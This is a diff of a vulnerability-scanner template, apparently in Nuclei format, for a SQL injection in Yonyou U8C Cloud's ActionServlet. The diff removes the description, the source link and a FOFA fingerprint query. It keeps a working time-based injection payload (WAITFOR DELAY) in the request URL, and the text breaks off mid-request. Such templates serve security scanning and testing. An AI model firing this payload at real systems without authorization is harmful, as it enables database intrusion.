@@ -3,12 +3,8 @@ info:
   name: 用友-U8C-Cloud com-ufida-web-action sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uxko8mrgqkh7zqq7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uxko8mrgqkh7zqq7
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--&db_type=mssql HTTP/1.1
